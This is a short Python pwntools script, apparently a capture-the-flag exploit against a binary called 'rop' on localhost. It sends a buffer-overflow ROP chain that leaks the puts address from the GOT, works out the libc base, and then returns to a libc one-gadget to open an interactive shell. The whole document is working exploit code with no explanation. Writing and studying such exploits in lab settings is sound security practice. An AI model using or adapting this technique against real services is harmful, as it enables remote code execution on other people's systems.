from pwn import *
context.log_level = 'debug'
context.arch='amd64'

###

pop_rdi = 0x400683

libc_pop_rcx = 0x3eb0b

oneshot = 0x4f2c5

###

#p = process("./rop", env={"LD_PRELOAD": "./libc-2.27.so"})
p = remote("localhost", "8000")
b = ELF("./rop")
libc = ELF("./libc-2.27.so")

#gdb.attach(p, "b *{}".format(pop_rdi))

payload = flat("A"*0x20,
               "B"*0x8,
               pop_rdi, b.got['puts'],
               b.plt['puts'],
               b.symbols['main']
               )

p.sendlineafter("Hello\n", payload)

puts = p.recvline().strip()
puts = u64(puts.ljust(8, "\x00"))

libc.address = puts - libc.symbols['puts']

payload2 = flat("A"*0x20,
                "B"*0x8,
                libc.address + libc_pop_rcx, 0,
                libc.address + oneshot
                )

p.sendlineafter("Hello\n", payload2)

p.interactive()
